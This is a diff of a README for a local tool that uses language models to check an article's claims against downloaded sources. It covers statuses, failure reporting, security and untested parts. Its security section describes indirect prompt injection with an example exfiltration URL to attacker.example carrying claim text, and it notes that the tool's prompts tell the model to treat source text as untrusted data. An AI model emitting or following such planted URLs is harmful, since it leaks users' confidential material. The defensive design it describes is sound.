@@ -7,16 +7,16 @@ Research Verification Workbench checks a written article, memo or brief against 
 What it does, in order:
 
 1. **Import** an article (`.docx`, `.pdf`, `.md`, `.markdown`, `.txt`) or paste it. Each save is an immutable, numbered checkpoint.
-2. **Extract claims.** A model splits the text into atomic, checkable assertions, each tied to its exact span in the article. Spans that cannot be located verbatim are rejected.
+2. **Extract claims.** A model splits the text into atomic, checkable assertions, each tied to its span in the article. A span must be found in the article exactly or after normalizing quotes, spacing and elisions; a single span that cannot be found fails the whole extraction.
 3. **Build the corpus.** Reuses sources already in your local warehouse, then (optionally) searches the web for primary sources, downloads them, hashes them and links them to the claims. You can also register sources by URL yourself.
-4. **Verify.** Each claim is compared against verbatim passages from a sealed snapshot of the corpus. The outcome is one of VERIFIED, OVERSTATED, MISCITED, UNSUPPORTED, CONTRADICTED, STALE, UNVERIFIABLE, FABRICATED or NOT_APPLICABLE, with a pin cite, the gap, and a recommended fix.
+4. **Verify.** A model compares each claim with at most 5 passages from a sealed snapshot of the corpus, chosen by shared words. The outcome is one of VERIFIED, OVERSTATED, MISCITED, UNSUPPORTED, CONTRADICTED, STALE, UNVERIFIABLE, FABRICATED or NOT_APPLICABLE, with a pin cite, the gap, and a recommended fix. See [What each status means](#what-each-status-means): a claim with nothing to compare is UNVERIFIABLE and says so.
 5. **Review adversarially (optional).** An independent discovery pass, a red-team challenge and a reconciliation, without editing your text.
 6. **Fix draft (optional).** A model proposes a revised version that addresses every finding. It is saved as a new checkpoint with an issue-by-issue audit and must be verified again.
 7. **Export** the report as CSV, XLSX, DOCX or PDF.
 
 > **Cost.** In the default mode every model step calls the paid OpenAI API with **your own API key**, billed to your OpenAI account. A long article can need hundreds of calls. The app enforces call-count and input-size limits (see [Configuration](#configuration)), but these are not dollar limits. Set a monthly budget in your OpenAI account before use.
 >
-> **Confidentiality.** Article text, extracted claims and source passages are sent to the model provider you configure. Do not process privileged, confidential, client or export-controlled material unless your professional obligations, your client's consent and the provider's terms permit it. See [DISCLAIMER.md](DISCLAIMER.md).
+> **Confidentiality.** Article text, extracted claims and source passages are sent to the model provider you configure. Word comments, headers, footers, notes and tracked insertions are part of the extracted text, so they are sent too. When you build a corpus with discovery in the default mode, OpenAI's hosted web search receives search queries derived from your claims, and source websites receive your download requests. Do not process privileged, confidential, client or export-controlled material unless your professional obligations, your client's consent and the provider's terms permit it. See [DISCLAIMER.md](DISCLAIMER.md).
 
 ## Requirements
 
@@ -42,7 +42,7 @@ Open <http://127.0.0.1:3080>. Migrations run automatically every time the app co
 
 **Never publish the container port on all interfaces.** Do not run `docker run -p 3080:3080` (or edit the compose `ports:` entry to drop `127.0.0.1:`): the container listens on `0.0.0.0` internally and the workbench has no user accounts, so that would expose it to your whole network. Always use `-p 127.0.0.1:3080:3080`. On a shared machine, other local users can still reach `127.0.0.1`: set `WORKBENCH_TOKEN` (below) there.
 
-The compose file pins both base images by digest, publishes the app on `127.0.0.1` only, gives the database no published port and puts it on an internal-only network, and runs the app as a non-root user with all Linux capabilities dropped, a read-only root filesystem (only `/tmp` in memory and the `workbench-data` volume are writable), and memory and process limits on both containers. **The compose setup has not been run by the publisher for this release** (see [Limitations](#limitations)).
+The compose file pins both base images by digest, publishes the app on `127.0.0.1` only, gives the database no published port and puts it on an internal-only network, and runs the app as a non-root user with all Linux capabilities dropped, a read-only root filesystem (only `/tmp` in memory and the `workbench-data` volume are writable), and memory and process limits on both containers. **The compose setup was not run for this commit** (see [Limitations](#limitations)).
 
 ### Option B: Node.js with your own PostgreSQL
 
@@ -73,14 +73,14 @@ python -m venv .venv
 .venv/bin/python -m pip install python-docx reportlab
 ```
 
-Then set `ARTIFACT_PYTHON` in `.env` to that interpreter (for example `.venv/bin/python` or `.venv\Scripts\python.exe`, as an absolute path). The Docker image already contains this runtime. Note that `python-docx` and `reportlab` are not hash-pinned here; the Docker image takes them from Debian packages.
+Then set `ARTIFACT_PYTHON` in `.env` to that interpreter (for example `.venv/bin/python` or `.venv\Scripts\python.exe`, as an absolute path). The Docker image already contains this runtime, and Compose always uses it, whatever `.env` says. Note that `python-docx` and `reportlab` are not hash-pinned here; the Docker image takes them from Debian packages.
 
 ### Quick start in the browser
 
 1. Create a project, then paste an article or import a file.
 2. **Extract claims**, review the claim ledger, and mark claims that need no outside evidence.
-3. **Build corpus** (shows a query/cost estimate first) or add source URLs by hand.
-4. **Verify**, then open findings, read the quoted passages and download the original sources.
+3. **Build corpus** (shows a query/cost estimate first). Verify stays disabled in the page until a sealed corpus exists. A source URL added by hand in the page is only registered: the page has no download button, so it stays unread until you call `POST /api/projects/{id}/sources/{source_id}/acquire` ([docs/API.md](docs/API.md)) and build the corpus or verify again.
+4. **Verify**, then open findings, read the quoted passages and download the original sources. Sources that could not be used appear in the Sources panel marked NOT USED.
 5. Export a report, or run **Fix draft** and verify the new version again.
 
 The readiness panel (`GET /api/readiness`) shows what is configured: database, storage, model, discovery, document runtime and today's AI usage.
@@ -130,9 +130,39 @@ Without `SOURCE_CORPUS_URL` the feature is simply off: the import route answers 
 
 The browser UI uses a JSON HTTP API that other local tools can call. It is documented in [docs/API.md](docs/API.md).
 
+## What each status means
+
+Every status is a label on one claim, not a certification. Read the quoted passage yourself.
+
+| Status | Who decides | What it means |
+|---|---|---|
+| `VERIFIED` | Model, plus one mechanical test | A model judged a passage adequate for the claim, and its quotation appears verbatim in that passage. The test proves the quote exists, not that it supports the claim: a very short quote, even a single common word, passes it. |
+| `OVERSTATED`, `MISCITED`, `CONTRADICTED`, `STALE`, `FABRICATED` | Model only | The model's reading of the passages it was shown. Nothing in the code checks them: `STALE` has no freshness check behind it and `FABRICATED` has no lookup behind it. |
+| `UNSUPPORTED` | Model | The model examined the retrieved passages and found no support. The gap says how many it saw, for example "Not found in the 3 passages retrieved". Only the best word matches are retrieved, so support elsewhere in a source may not have been seen. |
+| `UNVERIFIABLE` | Code or model | Usually nothing was compared: `not_checked_reason` says why, and the gap begins "Nothing was checked". It says nothing about whether the claim is true. See below. |
+| `NOT_APPLICABLE` | Code, from a model's or person's flag | The claim is marked as needing no outside source. It was not checked and is not verified. |
+| `NOT_CHECKED` | Display only | An older run that saved a provider outage as UNVERIFIABLE. Stored data is unchanged. |
+
+`not_checked_reason` on a result:
+
+| Reason | Meaning |
+|---|---|
+| `NO_SOURCES` | No source is linked to the claim. |
+| `NO_ELIGIBLE_SOURCE` | Sources are linked, but none qualifies: only `PRIMARY` does when the claim requires a primary source, `PRIMARY` or `SECONDARY` otherwise. `UNKNOWN` never does. |
+| `SOURCES_UNAVAILABLE` | A qualifying source could not be read: its download failed or was blocked, it was held for review, it has no readable text, or it looks like a login or access page. |
+| `NO_MATCHING_PASSAGE` | Qualifying text exists, but no passage shares a word with the claim, so nothing went to the model. |
+| `INVALID_MODEL_REPLY` | Passages were sent, but the reply failed validation, for example a quotation that is not in the passage. |
+
+**`PRIMARY` and `SECONDARY` are a model's judgment unless a person set them.** A discovered source takes the label the discovery model gave it; nothing checks that label against the document. Each result records `source_class` and `source_class_assigned_by`, shown in the page and in exports: `MODEL`, `CALLER` (a person or a client program through the page or API), `DEFAULT` (a reused source nobody assessed, treated as `SECONDARY`) or `UNKNOWN` (linked before this was recorded). Whether a claim needs a primary source at all is also set by the extraction model, unless a person corrects it in claim review.
+
+**What the Workbench can tell about a blocked or login-walled source.** HTTP errors, refused addresses and download failures are recorded. A page that answers HTTP 200 is treated as a suspected login or access page only if it is under 2,000 characters and uses typical wording, such as two of "sign in", "subscribe", "enable JavaScript" and "access denied". A longer wall, or one worded differently, is stored as ordinary text. If it shares no words with a claim the claim reads `NO_MATCHING_PASSAGE`; if it does, it goes to the model like any other passage.
+
 ## Failure reporting
 
-- If the AI provider fails during verification, the run stops and is marked FAILED with the reason. Claims not yet checked have no result. Older runs that saved such outages as UNVERIFIABLE display as NOT_CHECKED (stored data unchanged) and stay out of Fix draft.
+- If the AI provider fails during verification, the run stops and is marked FAILED with the reason. Claims not yet checked have no result. This covers HTTP errors, connection failures, and a 200 reply that is empty, refused, incomplete or not JSON. Older runs that saved such outages as UNVERIFIABLE display as NOT_CHECKED (stored data unchanged) and stay out of Fix draft.
+- A reply that is valid but contains an invalid quotation stays a per-claim UNVERIFIABLE (`INVALID_MODEL_REPLY`) in a run that completes.
+- A discovered source that could not be used is listed in the discover response (`source_failures`), in the workspace (`discovery_failures`) and on the verification run (`evidence_gaps`), and its claims follow the table above.
+- A run can be COMPLETE with nothing compared. `assertions_attempted` counts only claims whose passages were sent to the model.
 - In n8n mode, `/api/readiness` asks the gateway (`/healthz`) whether it is answering. Direct OpenAI mode has no free probe and reports the credential only.
 - Temporary provider failures return HTTP 503. A rejection that retrying cannot fix (bad login, disallowed model, other 4xx) returns 500 with its reason, so scripts can stop retrying.
 - Normalized text that is gzip bytes or over 1% control characters is left out of the sealed snapshot, and its claims report evidence as unavailable. Stray NUL bytes in otherwise good text are removed from passages. Gzip sent without a header is decompressed on new downloads. Already stored unreadable sources stay unreadable until re-acquired or re-extracted.
@@ -149,22 +179,22 @@ The browser UI uses a JSON HTTP API that other local tools can call. It is docum
 - **Optional access token.** Set `WORKBENCH_TOKEN` to a random value of 16+ characters (for example `node -e "console.log(require('crypto').randomBytes(24).toString('hex'))"`). API requests must then send `Authorization: Bearer <token>`. The web page asks for the token once, exchanges it at `POST /api/session` for an HttpOnly, SameSite=Strict cookie, and then works normally (downloads included). The static page itself carries no data and stays open. Use this on shared machines or whenever other local users or processes should not reach the app. It is a single shared secret over plain HTTP on loopback, not a user-account system.
 - **Browser attacks are blocked**: requests must carry a loopback `Host` header (DNS-rebinding defence), foreign or `null` `Origin` and cross-site Fetch Metadata are rejected, and JSON routes require `application/json`.
 - **Untrusted sources**: source downloads reject private, loopback, link-local, shared and multicast addresses (including through redirects and DNS rebinding), are size- and time-limited, and stored originals are served as sandboxed attachments.
-- **Credentials** come only from environment variables or files you create; they are never stored in the database, written to logs or passed to document subprocesses. Error responses are generic and carry a request ID.
-- **Evidence integrity**: each verification run binds a sealed snapshot of claim and source hashes; changed or missing evidence fails the run before any model call.
-- **Model-chosen URLs are screened.** Discovery fetches URLs that a web-search model returns, and a planted passage could try to make the model emit `https://attacker.example/?q=<claim text>`. Before any fetch, query strings and fragments are removed from discovered URLs unless the host is trusted: `.gov`, `.mil`, `gov.uk`, `europa.eu`, `epo.org`, `wipo.int`, `courtlistener.com`, `law.cornell.edu`, `arxiv.org`, `doi.org` and their subdomains, plus anything in `DISCOVERY_TRUSTED_HOSTS`. The host itself is still contacted, and path segments can still carry data, so this limits rather than eliminates the channel. For full control set `DISCOVERY_REQUIRE_ACCEPTANCE=1`: discovered URLs are then **not fetched**; they are recorded with disposition `HUMAN_REVIEW` (table `discovery_candidates`, with the reason) and you add the ones you accept through the Sources panel. The review list has no screen of its own in the web page yet, which is why the default is off.
-- **Temporary files** holding uploaded articles and report data are written to a private (mode 0700) temporary directory with 0600 files and removed afterwards.
-- Model output is untrusted: it can be wrong and can be influenced by text inside sources (prompt injection). Read the quoted passages yourself.
+- **Credentials** come only from environment variables or files you create; they are never stored in the database, written to logs or passed to document subprocesses. Error responses carry a controlled message and a request ID, not raw exception text; the `error_message` kept on run records is described in [docs/API.md](docs/API.md).
+- **Evidence integrity**: each verification run binds a sealed snapshot of claim and source hashes. A changed or missing stored original or normalized text fails the run before any model call. Text imported from Get Files is also compared with the hash in its manifest at import, when the service supplies one. These checks show the stored files have not changed; they do not show the extracted text is a faithful copy of the document.
+- **Model-chosen URLs are screened.** Discovery fetches URLs that a web-search model returns, and a planted passage could try to make the model emit `https://attacker.example/?q=<claim text>`. Before any fetch, query strings and fragments are removed from discovered URLs unless the host is trusted: `.gov`, `.mil`, `gov.uk`, `europa.eu`, `epo.org`, `wipo.int`, `courtlistener.com`, `law.cornell.edu`, `arxiv.org`, `doi.org` and their subdomains, plus anything in `DISCOVERY_TRUSTED_HOSTS`. The host itself is still contacted, and path segments can still carry data, so this limits rather than eliminates the channel. For full control set `DISCOVERY_REQUIRE_ACCEPTANCE=1`: discovered URLs are then **not fetched**; they are recorded with disposition `HUMAN_REVIEW` (table `discovery_candidates`, with the reason) and you add the ones you accept through the Sources panel. The held URLs appear in the Sources panel marked NOT USED and in the workspace as `discovery_failures`, but the page has no accept button and no download button, which is why the default is off.
+- **Temporary files** holding uploaded articles and report data are written to a private temporary directory (mode 0700, files 0600, on Linux and macOS; on Windows these modes do not apply and your user's temporary folder protects them) and removed afterwards. If removal fails, a log line says so.
+- **Prompt injection.** Extraction, verification, classification and review prompts tell the model that text inside documents and sources is untrusted data, and mark it as such in the request. This lowers the risk and does not remove it: model output is untrusted, can be wrong and can be influenced by text inside sources. Read the quoted passages yourself.
 
 See [SECURITY.md](SECURITY.md) for reporting vulnerabilities.
 
 ## Limitations
 
-- Verification quality depends on the model and on which sources were acquired. A VERIFIED result means a model judged a quoted passage adequate; it is not legal or factual certification.
+- Verification quality depends on the model and on which sources were acquired. A VERIFIED result means a model judged a quoted passage adequate; it is not legal or factual certification. See [What each status means](#what-each-status-means).
 - Document extraction covers native text, DOCX tables, notes, headers and footers. Image-only PDF pages fail; scanned content, figures and layout need human review. No OCR.
-- Paywalled, login-protected or script-rendered sources usually cannot be acquired.
+- Paywalled, login-protected or script-rendered sources usually cannot be acquired, and not every login page can be recognized (see [What each status means](#what-each-status-means)).
 - Usage limits count calls and bytes, not money. Timeouts stop new calls but cannot cancel work a provider already accepted.
-- Direct OpenAI discovery (web search through the Responses API) is new in this release and was tested only against recorded responses, not the live API.
-- The Docker Compose setup and the Dockerfile were not built or run for this release. The offline test suite was run (see CHANGELOG). The PostgreSQL integration harness (`scripts/test-checkpoint-postgres.mjs`) needs Docker and was not run.
+- No real model has been called in the publisher's testing of this commit: extraction, verification and discovery (web search through the Responses API) ran only against a fake provider. How accurate a real model is, and whether the default model names and strict schemas work on the live API, is unknown.
+- The Docker Compose setup and the Dockerfile were not built or run for this commit. An earlier commit's image was built and started during a suite installer test. The offline tests and a run against real PostgreSQL 16 with a fake provider were done for this commit (see CHANGELOG). The container harness (`scripts/test-checkpoint-postgres.mjs`) needs Docker and was not run.
 - One app process per database (enforced by an advisory lock).
 
 ## Tests
@@ -174,7 +204,7 @@ npm ci
 npm test
 ```
 
-The suite runs offline with no database, no network and no API key. Four XLSX/readiness tests are skipped unless a Python document runtime is found (`ARTIFACT_PYTHON` or `.venv`).
+The suite runs offline with no database, no network and no API key. Four XLSX/readiness tests are skipped unless a Python document runtime is found (`ARTIFACT_PYTHON` or `.venv`). Five tests that need real PostgreSQL are skipped unless `TEST_DATABASE_URL` points at a scratch database whose name contains `test`.
 
 ## Uninstall
 
